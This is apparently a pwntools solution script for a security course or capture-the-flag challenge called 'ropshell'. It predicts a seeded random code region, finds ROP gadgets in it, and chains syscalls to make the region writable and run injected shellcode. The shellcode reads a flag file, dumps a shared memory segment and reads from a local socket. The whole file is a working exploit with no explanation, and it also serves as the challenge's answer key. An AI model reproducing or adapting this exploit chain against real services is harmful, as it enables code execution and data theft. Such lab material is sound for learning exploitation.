#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *
import ctypes
import mmap
import struct

libc = ctypes.CDLL('libc.so.6')
context.arch = 'amd64'
context.os = 'linux'

r = None
if 'qemu' in sys.argv[1:]:
    r = process("qemu-x86_64-static ./ropshell", shell=True)
elif 'bin' in sys.argv[1:]:
    r = process("./ropshell", shell=False)
elif 'local' in sys.argv[1:]:
    r = remote("localhost", 10494)
else:
    r = remote("up23.zoolab.org", 10494)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

# get timestamp and base address

trash = r.recvuntil(b"Timestamp is ")
timestamp = r.recvline().decode("ascii").strip()
# print(timestamp)

trash = r.recvuntil(b"Random bytes generated at ")
base_addr = r.recvline().decode("ascii").strip()
print("base address: " , base_addr)

libc.srand(int(timestamp))
LEN_CODE = 10*0x10000
codeint = []

for i in range(0, int(LEN_CODE/4)):
    tmp = ((libc.rand()<<16) | (libc.rand() & 0xffff))
    
    codeint.append(ctypes.c_uint(tmp).value.to_bytes(4, 'little'))

codeint[libc.rand() % (LEN_CODE//4 - 1)] = ctypes.c_uint(0xc3050f).value.to_bytes(4, 'little')
code = b''.join(codeint)

## Q1
pop_rax = asm('''pop rax
               ret''')
pop_rdi = asm('''pop rdi
                ret''')
pop_rsi = asm('''pop rsi
               ret''')
pop_rdx = asm('''pop rdx
                ret''')
syscall = asm('''syscall
                ret''')
ret = asm('''ret''')

pop_rax_addr = int(base_addr, 16) + code.find(pop_rax)
pop_rdi_addr = int(base_addr, 16) + code.find(pop_rdi)
pop_rsi_addr = int(base_addr, 16) + code.find(pop_rsi)
pop_rdx_addr = int(base_addr, 16) + code.find(pop_rdx)
syscall_addr = int(base_addr, 16) + code.find(syscall)
ret_addr = int(base_addr, 16) + code.find(ret)
# print(len(code))
# print(exit_num_addr)

shellcode1 = shellcraft.exit(37)
stack1 = p64(pop_rax_addr) + p64(60) + p64(pop_rdi_addr) + p64(37) + p64(syscall_addr)

# r.sendafter(b"shell> ", stack1)

## Q2
# mprotect
stack_make_codeint_writable = p64(pop_rax_addr) + p64(10) \
                            + p64(pop_rdi_addr) + p64(int(base_addr, 16)) \
                            + p64(pop_rsi_addr) + p64(mmap.PAGESIZE) \
                            + p64(pop_rdx_addr) + p64(7) \
                            + p64(syscall_addr)
                            
# shellcode to overwrite codeint
shellcode2 = shellcraft.open('/FLAG', 4) # open file
shellcode2 += shellcraft.read('rax', 'rsp', 67) # read file
shellcode2 += shellcraft.write(1, 'rsp', 67) # write to stdout
# shellcode2 += 'ret;'
# print(asm(shellcode))



# stack2 = stack_make_codeint_writable + overwrite_codeint + call_shellcode
# r.sendafter(b"shell> ", stack2)
# r.sendafter(b"received.", asm(shellcode2))

## Q3
# get share memory
shellcode3 = 'mov rax, 29;'
shellcode3 += 'mov rdi, 0x1337;' # key
shellcode3 += 'mov rsi, 4096;' # PAGESIZE
shellcode3 += 'mov rdx, 0x0400;' # SHM_R
shellcode3 += 'syscall;'
shellcode3 += 'mov rdi, rax;' # mov identifier to rdi
# attach share memory
shellcode3 += 'mov rax, 30;'
shellcode3 += 'mov rsi, 0;' # shm address
shellcode3 += 'mov rdx, 0x01000;' # SHM_RDONLY
shellcode3 += 'syscall;'
# write to stdout
shellcode3 += shellcraft.write(1, 'rax', 69) 
# shellcode3 += 'ret;'

# stack3 = stack_make_codeint_writable + overwrite_codeint + call_shellcode
# r.sendafter(b"shell> ", stack3)
# r.sendafter(b"received.", asm(shellcode3))

## Q4
# connect
shellcode4 = shellcraft.connect('localhost',0x1337)
# print(shellcode4)
shellcode4 += shellcraft.read('rdi', 'rsp', 67) # read from socket fd (store in rdi)
shellcode4 += shellcraft.write(1, 'rsp', 67) # write to stdout
# shellcode4 += 'ret;'

# stack4 = stack_make_codeint_writable + overwrite_codeint + call_shellcode
# r.sendafter(b"shell> ", stack4)
# r.sendafter(b"received.", asm(shellcode4))


# use read(stdin) to put the shell code into buf(*codeint) 
overwrite_codeint = p64(pop_rax_addr) + p64(0) \
                    + p64(pop_rdi_addr) + p64(0) \
                    + p64(pop_rsi_addr) + p64(int(base_addr, 16)) \
                    + p64(pop_rdx_addr) + p64(len(shellcode2 + shellcode3 + shellcode4 + shellcode1)) \
                    + p64(syscall_addr)
                
# write "/FLAG" content
call_shellcode =  p64(int(base_addr, 16))
stack = stack_make_codeint_writable + overwrite_codeint + call_shellcode

r.sendafter(b"shell> ", stack)
r.sendafter(b"received.", asm(shellcode2 + shellcode3 + shellcode4 + shellcode1))
# r.sendline(asm(shellcode3))
# r.sendline(asm(shellcode4))

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
